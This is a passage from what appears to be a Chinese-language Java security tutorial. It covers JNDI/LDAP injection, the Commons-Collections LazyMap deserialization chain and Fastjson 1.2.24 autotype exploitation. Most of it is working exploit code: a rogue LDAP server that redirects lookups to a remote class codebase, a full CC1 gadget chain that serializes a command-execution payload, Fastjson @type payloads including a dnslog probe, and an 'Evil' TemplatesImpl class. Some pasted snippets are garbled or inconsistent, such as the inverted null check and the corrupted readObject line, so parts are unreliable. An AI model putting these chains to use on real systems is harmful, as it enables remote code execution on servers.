import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
public class ldap_Hack_server {
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://192.168.1.27:8081/#jndiexp"};
        int port = 7777;
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult
                                                  result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

ldap_target_Server.java

```java
package com.example.demo;

import javax.naming.InitialContext;
import javax.naming.NamingException;
public class ldap_target_Server {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        initialContext.lookup("ldap://127.0.0.1:7777/Exp");
    }
}
```

dns探测

```java
package com.example.demo2;

import javax.naming.InitialContext;
import javax.naming.NamingException;
public class ldap_target_Server {
    public static void main(String[] args) throws NamingException {
        InitialContext initialContext = new InitialContext();
        //initialContext.lookup("ldap://127.0.0.1:7777/Exp");
        initialContext.lookup("dns://dns.y6u1ft.dnslog.cn");
    }
}
```

### （四）、CC3链

Apache commons-collections组件反序列化漏洞的反射链也称为CC链，自从apache commons-collections组件爆出第一个java反序列化漏洞后，就像打开了java安全的新世界大门一样，之后很多java开源组件相继都爆出反序列化漏洞。CC链的原理就是**利用反射获取类**，放到**readObject**方法

在挖掘反序列化漏洞时比较常用的利用工具ysoserial就使用LazyMap类的利用链，接下来我们学习LazyMap类的利用链。

1、相关知识介绍

**InvokerTransformer**继承自Transformer类， 这个类有一个函数叫transform，它的作用很简单，会把当前类的iMethodName和iParamTypes进行反射调用。

```java
public object transform(object input) {
    // 检查输入对象是否为 null
    if (input != null) {
        return null; // 如果是 null，则返回 null

        // 尝试进行方法调用
        try {
            // 获取输入对象的类
            Class cls = input.getClass();

            // 获取指定名称和参数类型的方法
            Method method = cls.getMethod(imethodname, iparamtypes);

            // 调用获取的方法
            return method.invoke(input, iargs);
        } catch (NoSuchMethodException ex) {
            // 捕获方法不存在的异常
            throw new FunctorException("InvokerTransformer: The method '" + imethodname +
                "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            // 捕获无法访问方法的异常
            throw new FunctorException("InvokerTransformer: The method '" + imethodname +
                "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            // 捕获方法调用抛出的异常
            throw new FunctorException("InvokerTransformer: The method '" + imethodname +
                "' on '" + input.getClass() + "' threw an exception");
        }
    } else {
        // 输入对象为 null，直接返回 null
        return null;
    }
}

```

2、案例1-利用反射机制调用runtime.exec方法执行命令

```java
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class CC1Test {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException {
        //获取类
        Class runtimeClazz = Class.forName("java.lang.Runtime");
        Method getRuntimeMethod = runtimeClazz.getMethod("getRuntime");

        //获取类实例
        Runtime singleRuntime = (Runtime)getRuntimeMethod.invoke(null);

        //获取exec方法
        Method execMethod = runtimeClazz.getDeclaredMethod("exec", String.class);

        //反射执行
        execMethod.invoke(singleRuntime, "calc");
    }
}
```

3、案例2- 利用Transformer调用EXEC函数

为了能顺利的通过Transformer的transform调用Exec函数，我们构造如下代码 

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.lang.reflect.Field;

public class CC1Test2 {
    public static void main(String[] args) {
        // 创建一个ChainedTransformer对象
        ChainedTransformer transformerChain = new ChainedTransformer();

        // 创建一个ConstantTransformer对象
        Transformer constantTransformer = new ConstantTransformer(1);

        // 将ConstantTransformer对象添加到ChainedTransformer对象中
        transformerChain.addTransformer(constantTransformer);

        // 创建一个恶意的Transformer数组
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class }, new String[]{"calc"}),
            new ConstantTransformer(1)
        };

        try {
            // 使用反射尝试修改ChainedTransformer对象中私有字段iTransformers的值
            Class<?> chainedTransformerClass = Class.forName("org.apache.commons.collections.functors.ChainedTransformer");
            Field iTransformers = chainedTransformerClass.getDeclaredField("iTransformers");
            iTransformers.setAccessible(true);
            iTransformers.set(transformerChain, transformers);

            // 触发恶意链执行
            transformerChain.transform(new Object());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

3、案例3- POC构造实现反序列化调用EXEC

**LazyMap**

LazyMap本质上也是一个Map，它允许指定一个Transformer作为它的工厂类。 

工厂类的意思是，当进行Map操作时，这个工厂类会对它进行修饰(使用工厂类的transform函数)

```java
// 继承自 LazyMap 类的构造函数
protected LazyMap(Map map, Transformer factory) {
    // 调用父类的构造函数并传入 map
    super(map);

    // 如果传入的 factory 是 null，抛出异常
    if (factory == null) {
        throw new IllegalArgumentException("Factory must not be null");
    }

    // 设置工厂变量
    this.factory = factory;
}

// 重写父类的 get 方法
public Object get(Object key) {
    // 如果键不在映射中
    if (!map.containsKey(key)) {
        // 创建对应键的值
        Object value = factory.transform(key);

        // 将键值对放入映射中
        map.put(key, value);

        // 返回值
        return value;
    }

    // 如果键存在于映射中，则直接返回对应的值
    return map.get(key);
}

```

**AnnotationInvocationHandler** 

最后一步，我们需要寻找在重载了readObject函数中，会调用map属性get方法的类。 没错，这个类就是AnnotationInvocationHandler，首先看一下它的类声明。

```java
// 实现 InvocationHandler 和 Serializable 接口的类
class AnnotationInvocationHandler implements InvocationHandler, Serializable {

    // 序列化版本号
    private static final long serialVersionUID = 6182022883658399397L;

    // 注解类型
    private final Class<? extends Annotation> type; // type: class@707

    // 存储注解成员的值
    private final Map<String, Object> memberValues; // membervalues: lazymap@741

    // 用于存储注解类型的成员方法的缓存，初始时为 null
    private transient volatile Method[] memberMethods = null; // membermethods: null
}

```

可以看到存在对应的map属性，接下来查看它的invoke方法，可以看到调用了get方法

```java
public Object invoke(Object var1, Method var2, Object[] var3) {
    // var1: 代理对象，var2: 被调用的方法，var3: 方法的参数数组
    // var1: $proxy0@738, var2: method@739, var3: null

    // 获取被调用方法的名字
    String var4 = var2.getName(); // var4 (slot 4): "entryset" 或 "set"

    // 获取被调用方法的参数类型数组
    Class[] vars = var2.getParameterTypes(); // vars (slot s): class[oje74d var2: method@739

    // 如果方法名为 "equals"，且参数个数为 1，且参数类型为 Object 类型
    if (var4.equals("equals") && var3.length == 1 && vars[0].equals(Object.class)) {
        return this.equalsImpl(var3[0]); // 执行 equals 方法
    } else {
        assert var3.length == 0; // 断言参数个数为 0
        // var5 (slot_5): class[0]@740

        // 如果方法名为 "toString"
        if (var4.equals("toString")) {
            return this.toStringImpl(); // 执行 toString 方法
        } else if (var4.equals("hashCode")) { // 如果方法名为 "hashCode"
            return this.hashCodeImpl(); // 执行 hashCode 方法
        } else if (var4.equals("annotationType")) { // 如果方法名为 "annotationType"
            return this.type; // 返回注解类型信息
            // type: class@707
        } else { // 对于其他方法名
            Object var6 = this.memberValues.get(var4); // 从成员值中获取对应值
            // membervalues: lazymap@741, var4 (slot 4): "entryset"
            return var6; // 返回对应值
        }
    }
}

```

**AnnotationInvocationHandler** 

这里有一个问题，就是AnnotationInvocationHandler在它重载的readObject函数当中，并没有调用 invoke方法，为什么它却是可以利用的? 

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
    var1.defaultReadObject(); // 默认反序列化对象

    AnnotationType var2 = null;

    try {
        var2 = AnnotationType.getInstance(this.type); // 获取注解类型信息
    } catch (IllegalArgumentException var9) {
        throw new InvalidObjectException("Non-annotation type in annotation serialization stream");
    }

    Map<String, Class<?>> var3 = var2.memberTypes(); // 获取注解成员类型的映射

    // 遍历成员值的 entrySet
    Iterator<Entry<String, Object>> var4 = this.memberValues.entrySet().iterator(); // 没有invoke
    while (var4.hasNext()) {
        Entry<String, Object> var5 = var4.next();
        String var6 = var5.getKey(); // 获取键
        Class<?> var7 = var3.get(var6); // 获取对应键的类型

        if (var7 != null) {
            Object var8 = var5.getValue(); // 获取值

            // 检查值是否与类型相符
            if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                // 如果类型不匹配，抛出异常
                throw new AnnotationTypeMismatchException(varb.getClass() + varb, varberberber((null));
            }

            // 将值设置到相应的字段上
            vars.setValue(var8);
        }
    }
}

```

让我们重新注意一下AnnotationInvocationHandler的声明

```java
// 实现 InvocationHandler 和 Serializable 接口的类
class AnnotationInvocationHandler implements InvocationHandler, Serializable {

    // 序列化版本号
    private static final long serialVersionUID = 6182022883658397L;

    // 注解类型
    private final Class<? extends Annotation> type;

    // 存储注解成员的值
    private final Map<String, Object> memberValues;

    // 用于存储注解类型的成员方法的缓存，初始时为 null
    private transient volatile Method[] memberMethods = null;

    // 构造函数，接收注解类型和成员值的映射
    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        // 初始化注解类型和成员值映射
        this.type = var1;
        this.memberValues = var2;
    }
}

```

让我们重新注意一下AnnotationInvocationHandler的声明

```java
import java.lang.annotation.Annotation;
import java.lang.reflect.Method;
import java.io.Serializable;
import java.util.Map;

public class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private static final long serialVersionUID = 6182022883658397L;

    // 存储注解的类型信息
    private final Class<? extends Annotation> type;

    // 存储注解成员的值
    private final Map<String, Object> memberValues;

    // 用于存储注解类型的成员方法的缓存，初始时为 null
    private transient volatile Method[] memberMethods = null;

    // 构造函数，接收注解类型和成员值的映射作为参数
    public AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        this.type = var1; // 设置注解类型
        this.memberValues = var2; // 设置注解成员的值
    }
}

```

它是一个**动态代理类**，这意味着我们可以使用该类包裹我们的LazyMap，这样就能触发它的invoke函数

```java
// 使用 AnnotationInvocationHandler 包装
class AnnotationInvocationHandlerClazz {
    // 获取 AnnotationInvocationHandler 类
    Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

    // 获取 AnnotationInvocationHandler 的构造函数
    Constructor<?> annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructors()[0];

    // 设置构造函数可访问
    annotationInvocationHandlerConstructor.setAccessible(true);

    // 创建一个代理映射
    Map proxyMap = (Map) Proxy.newProxyInstance(
            this.getClass().getClassLoader(),
            new Class[]{Map.class},
            new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    return null; // 在此处实现代理方法
                }
            }
    );
}

```

在AnnotationInvocationHandler的ReadObject中，它直接操作了自身的map

```java
// 获取注解成员类型的映射
Map<String, Class<?>> var3 = var2.memberTypes();

// 遍历成员值的 entrySet
Iterator<Entry<String, Object>> var4 = this.memberValues.entrySet().iterator();
while (var4.hasNext()) {
    Entry<String, Object> var5 = var4.next();

    // 获取键
    String var6 = var5.getKey();

    // 获取键对应的类型
    Class<?> var7 = var3.get(var6);

    // 如果类型不为空
    if (var7 != null) {
        // 获取值
        Object var8 = var5.getValue();

        // 检查值是否与类型相符
        if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
            // 如果类型不匹配，进行相应处理
            // 这里的处理逻辑可能涉及异常情况的处理
        }
    }
}

```

**这个链里面所有的核心知识点都讲完了，剩下就需要我们把这几个部分拼装起来就大功告成**

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1Test3 {
    public static void main(String[] args) {
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{ new ConstantTransformer(1) });
        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new InvokerTransformer("exec",
                new Class[] { String.class }, new String[]{"calc"}),
            new ConstantTransformer(1) };

        try{
            //构造ChainedTransfomer
            Class chainedTransformer = Class.forName("org.apache.commons.collections.functors.ChainedTransformer");
            Field iTransformers = chainedTransformer.getDeclaredField("iTransformers");
            iTransformers.setAccessible(true);
            iTransformers.set(transformerChain, transformers);

            //构造LazyMap
            Map map = LazyMap.decorate(new HashMap(), transformerChain);

            //使用AnnotationInvocationHandler包裹
            Class annotationInvocationHandlerClazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor annotationInvocationHandlerConstructor = annotationInvocationHandlerClazz.getDeclaredConstructors()[0];
            annotationInvocationHandlerConstructor.setAccessible(true);
            Map proxyMap =(Map) Proxy.newProxyInstance(
                map.getClass().getClassLoader(), map.getClass().getInterfaces(), (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, map));

            //return proxyMap 可以触发命令执行吗？ proxyMap (Map) -> readObject
            //将包裹后的map添加到AnnotationInvocationHandler中
            InvocationHandler annotationInvocationHandler = (InvocationHandler)annotationInvocationHandlerConstructor.newInstance(Override.class, proxyMap);

            //反序列化验证
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("D:\\ser.ser"));
            objectOutputStream.writeObject(annotationInvocationHandler);
            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("D:\\ser.ser"));
            objectInputStream.readObject();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```



## 十一、Fastjson漏洞
**基础介绍**

Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将 序列化的速度提升到极致，深受用户喜爱。 项目地址：https://github.com/alibaba/fastjson。产品主要提供两个接口 JSON.toJSONString 和 **JSON.parseObject/JSON.parse** 来分别实现 序列化和反序列化操作。 产品识别：使用不闭合花括号进行报错回显，报错中往往带有fastjson
实现序列化通常使用 JSON.toJSONString 接口，maven导入FastJson依赖包

添加pom.xml依赖

```xml
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.24</version>
        </dependency>

```

**fastjson的使用**

将类序列化为字符串,主要就是 JSON.toJSONString 函数的使用,该函数可以仅仅传入一个参数，也可以传入两个参数

user.java

```java
package com.example.demo;

public class user {
    private int age;
    private String username;
    private String password;

    // 默认无参数构造函数
    public user() {
        System.out.println("无参构造方法被调用");
    }

    public user(int age, String username, String password) {
        System.out.println("有参构造方法被调用");
        this.age = age;
        this.username = username;
        this.password = password;
    }

    public int getAge() {

        System.out.println("get函数被调用");
        return age;
    }

    public void setAge(int age) {
        System.out.println("set函数被调用");
        this.age = age;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    @Override
    public String toString() {
        System.out.println("toString函数被调用。。。");
        return "user{" +
                "age=" + age +
                ", username='" + username + '\'' +
                ", password='" + password + '\'' +
                '}' ;
    }
}
```

main.java

```java
package com.example.demo;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class main {
    public static void main(String[] args) throws Exception {
        user user = new user(12, "xbb", "123456");
        // 序列化⽅式
        String json1 = JSON.toJSONString(user);
        //生成的JSON字符串中包含类名，以便在反序列化时能够恢复正确的类类型
        String json2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(json1);
        System.out.println(json2);
        System.out.println("json1的变量类型：" + json1.getClass().getSimpleName());
}
```

<img width="1267" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/30f568e8-ac80-40a9-bcce-5d131a654d88">

将字符串还原为对象

涉及两个函数，

	JSON.parse
	
	JSON.parseObject

main.java

```java
package com.example.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class main {
    public static void main(String[] args) throws Exception {
        user user = new user(12, "xbb", "123456");
        // 序列化⽅式
        String json1 = JSON.toJSONString(user);
        //生成的JSON字符串中包含类名，以便在反序列化时能够恢复正确的类类型
        String json2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(json1);
        System.out.println(json2);
        System.out.println("json1的变量类型：" + json1.getClass().getSimpleName());

        //使用JSON.parse函数从字符串还原为对象
        System.out.println(JSON.parse(json1));
        //输出还原成什么类型；JSONObject
        System.out.println(JSON.parse(json1).getClass().getSimpleName());

        System.out.println(JSON.parseObject(json1));
        //输出还原成什么类型；JSONObject
        System.out.println(JSON.parseObject(json1).getClass().getSimpleName());

        //使用JSON.parseObject 函数从字符串还原为对象
        System.out.println(JSON.parse(json2));
        System.out.println();
        System.out.println(JSON.parseObject(json2));


    }
}
```

```
对于“  JSON.toJSONString(user) ”这种方式序列化的字符串，
	
	两种还原函数，得到的结果一致。

对于“ JSON.toJSONString(user, SerializerFeature.WriteClassName) ” 这种方式序列化得到的字符串，
	
	两个函数还原得到的结果不一致，且还原和上面的字符串还原的过程也不一致，

	对于json2字符串，使用JSON.parseObject函数还原的过程，
	
		调用无参构造方法
		调用了set函数
		调用了get函数
		输出结果和json1还原一致

	对于json1字符串，使用JSON.parseObject函数还原过程，
		调用无参构造方法
		调用set函数
		调用toString函数
		输出结果和以上3个不同

```
<img width="1267" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/d33bb216-6d64-4be2-9b6d-eefc6f7ccc52">

<img width="1068" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/66866fab-c6d1-4763-b37e-ea1457265589">


修改脚本执行命令

main.java

```java
package com.example.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;
public class main {
    public static void main(String[] args) throws Exception {
        String json2 = "{\"@type\":\"com.example.demo.user\",\"age\":12,\"password\":\"123456\",\"username\":\"calc\"}";
      //String json2 = "{\"@type\":\"com.example.demo.user\",\"age\":12,\"password\":\"123456\",\"username\":\"xxx\"}";

        System.out.println(JSON.parseObject(json2));
    }
}
```

user.java

```java
package com.example.demo;

import java.io.IOException;

public class user {

    private int age;
    private String username;
    private String password;

    // 默认无参数构造函数
    public user() {
        System.out.println("无参构造方法被调用");
    }

    public user(int age, String username, String password) {
        System.out.println("有参构造方法被调用");
        this.age = age;
        this.username = username;
        this.password = password;
    }

    public int getAge() {

        System.out.println("get函数被调用");
        return age;
    }

    public void setAge(int age) {
        System.out.println("set函数被调用");
        this.age = age;
    }

    public String getUsername() {return username; }

    public void setUsername(String username) {
        this.username = username;
        try {
     //       Runtime.getRuntime().exec("calc");
            Runtime.getRuntime().exec(username);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    @Override
    public String toString() {
        System.out.println("toString函数被调用。。。");
        return "user{" +
                "age=" + age +
                ", username='" + username + '\'' +
                ", password='" + password + '\'' +
                '}' ;
    }
}
```

<img width="1317" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/45f42b92-7412-4818-b427-6501559a4a26">

### （一）、fastjson漏洞利⽤原理与dnslog

**漏洞原理**

Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和 反序列化机制。通过Fastjson反序列化漏洞，攻击者可以传入一个恶**意构造的JSON内容**，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。 

在某些情况下进行反序列化时，会将反序列化得到的类或其子类的**构造函数**、 **getter/setter** 方法执行，如果这三种方法中存在可利用的入口，则可能导致反序列化漏洞的存在。

**构造POC **

一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类： 

```java
  { "@type":"xxx.xxx.xxx", "xxx":"xxx", ... }  
```

json字符串中带有@type

漏洞是利⽤fastjson autotype在处理json对象的时候，未对@type字段进⾏完全的安全性验证，

攻击者可以传⼊危险类，并调⽤危险类连接远程rmi主机，通过其中的恶意类执⾏代码。

攻击者通过这种⽅式可以实现远程代码执⾏漏洞的利⽤，获取服务器的敏感信息泄露，

甚⾄可以利⽤此漏洞进⼀步对服务器数据进⾏修改，增加，删除等操作，对服务器造成巨⼤的影响。

```java
package com.example.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;
public class main {
    public static void main(String[] args) throws Exception {

        String json2 = "{\"@type\":\"java.net.Inet4Address\", \"val\":\"aa.3htbvu.dnslog.cn\"}";
        System.out.println(JSON.parseObject(json2));
        //System.out.println(JSON.parse(json2));
    }
}
```

<img width="810" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/65f715f8-4bb2-4db2-927e-59cc3ae40ab2">

### （二）、fastjson漏洞场景

**1、FastJson <= 1.2.24 反序列化漏洞 -场景1**

导入依赖

```
<dependency>
		<groupId>com.alibaba</groupId>
		<artifactId>fastjson</artifactId>
		<version>1.2.24</version>
</dependency>

```

实体类Student中，存在不安全的setter方法，setHeight() 中有执行命令的行为。 

```java
package com.example.demo;

import java.io.IOException;
import java.io.Serializable;
import java.util.Properties;
/**
 * 反序列化漏洞：Student实体类
 **/
public class Student  implements Serializable {
    private String name;
    private int age;
    private String telephone;
    private Properties properties;
    public String height;
    public Student(){
        System.out.println("无参构造函数");
    }
    public Properties getProperties() {
        System.out.println("调用getProperties");
        return properties;
    }
    public String getHeight() {
        System.out.println("调用getHeight");
        return height;
    }
    /**
     * 不安全的setter方法
     * @return
     * @throws IOException
     */
    public void setHeight(String height) throws IOException{
        System.out.println("调用setHeight");
        Runtime.getRuntime().exec(height);
        this.height = height;
    }
    public String getName() {
        System.out.println("调用getName");
        return name;
    }
    public void setName(String name) throws IOException{
        System.out.println("调用setName");
        this.name = name;
    }
    public int getAge() {
        System.out.println("调用getAge");
        return age;
    }
    public String getTelephone() {
        System.out.println("调用getTelephone");
        return telephone;
    }
    @Override
    public String toString() {
        return "Student4{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", telephone='" + telephone + '\'' +
                ", properties=" + properties +
                ", height='" + height + '\'' +
                '}';
    }
}
```

使用 JSON.parseObject() 不指定class执行反序列化，会调用指定类的构造函 数、所有属性的getter方法、非私有属性的setter方法。 
构造POC： @type指定存在可控参数的类。 在height属性中添加命令，通过height属性的setter方法执行命令。
main

```java
package com.example.demo;

import com.alibaba.fastjson.JSON;
import java.io.IOException;
public class main {
    public static void main(String[] args) throws IOException {

        String jsonString = "{\"@type\":\"com.example.demo.Student\",\"age\":5,\"name\":\"Tom\",\"telephone\":\"123456\",\"height\":\"calc\",\"properties\":{}}";
        Object obj = JSON.parseObject(jsonString);
        System.out.println(obj);
        System.out.println(obj.getClass());


    }
}
```

<img width="1590" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/5a1a1b02-40e0-4639-885f-89b9f25ec4e3">

**FastJson <= 1.2.24 反序列化漏洞 -场景2**

影响范围： FastJson 1.2.22-1.2.24版本 利用： 

- 基于TemplateImpl 限制：需要设置Feature.SupportNonPublicField属性进行反序列化操作才能成功触发利用。 
- 基于JdbcRowSetImpl 限制：由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。 
- 基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、 7u201、8u191。 

**基于TemplateImpl **

环境依赖： 

```xml
<!-- fastjson 1.2.22-1.2.24 版本漏洞利用-->
        <dependency>
            <groupId>com.alibaba</groupId>
            <artifactId>fastjson</artifactId>
            <version>1.2.24</version>
        </dependency>
        <dependency>
            <groupId>commons-codec</groupId>
            <artifactId>commons-codec</artifactId>
            <version>1.15</version>
        </dependency>
        <dependency>
            <groupId>commons-io</groupId>
            <artifactId>commons-io</artifactId>
            <version>2.5</version>
        </dependency>
```

**fastjson反序列化TemplatesImpl 利⽤**

这个利用链在实战中利用较少，一个原因是有一些限制，

开启 Feature.SupportNonPublicField 得作用

```
需要 JSON.parseObject或者 JSON.parse
先看下这个 Feature.SupportNonPublicField 得作用，
先看下正常json反序列化得情况，
然后把set/get得一些函数给注释，
```

```java
package com.example.test;
import com.alibaba.fastjson.JSON;


public class main {
    public static void main(String[] args) throws Exception {

        String json2 = "{\"@type\":\"com.example.test.user\",\"age\":12,\"password\":\"123456\",\"username\":\"calc\"}";

        System.out.println(JSON.parse(json2));

    }

}
```

```java
package com.example.test;

public class user {

    private int age;
    private String username;
    private String password;

    // 默认无参数构造函数
    public user() {
        System.out.println("无参构造方法被调用");
    }

    public user(int age, String username, String password) {
        System.out.println("有参构造方法被调用");
        this.age = age;
        this.username = username;
        this.password = password;
    }

    /*public int getAge() {

        System.out.println("get函数被调用");
        return age;
    }

    public void setAge(int age) {
        System.out.println("set函数被调用");
        this.age = age;
    }

    public String getUsername() {return username; }

    public void setUsername(String username) {
        this.username = username;
        try {
//            Runtime.getRuntime().exec("calc");
            Runtime.getRuntime().exec(username);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }*/

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }


    @Override
    public String toString() {
        System.out.println("toString函数被调用。。。");
        return "user{" +
                "age=" + age +
                ", username='" + username + '\'' +
                ", password='" + password + '\'' +
                '}' ;
    }
}
```
<img width="963" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/cd8c74c1-e28f-4420-be2d-f7e04fbda45b">

为设置age、username属性得set/get函数去掉了，所以输出为空，
此时，我们加上 Feature.SupportNonPublicField 再看下

```java
package com.example.test;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class main {
    public static void main(String[] args) throws Exception {

        String json2 = "{\"@type\":\"com.example.test.user\",\"age\":12,\"password\":\"123456\",\"username\":\"calc\"}";

        System.out.println(JSON.parse(json2,Feature.SupportNonPublicField));
    }
}
```

<img width="704" alt="图片" src="https://github.com/bingtangbanli/java-/assets/77956516/4d635cc9-5a99-4c3b-af3b-46b461afb17a">

```
相当于开启了给属性增加了set/get得方法。

而上面我们分析 TemplatesImpl 利用链得时候，细心得同学可能发现了，

其对应得类缺少set/get函数，所以，这个链利用得条件就是rd在json反序列化得时候，

增加  Feature.SupportNonPublicField  这个参数，这也是该链利用得前提。
```

构造利用payload

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Evil extends AbstractTranslet {

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
//这两个transform方法覆盖了AbstractTranslet中的方法
    static {
        System.out.println("静态代码块");
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }

    {
        System.out.println("构造代码块");
    }

    public Evil() {
        System.out.println("无参构造");
    }

    public Evil(String arg) {
        System.out.println("有参构造");
    }
}
```

````java
package com.example.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;


public class test4 {
    public static void main(String[] args) throws Exception {

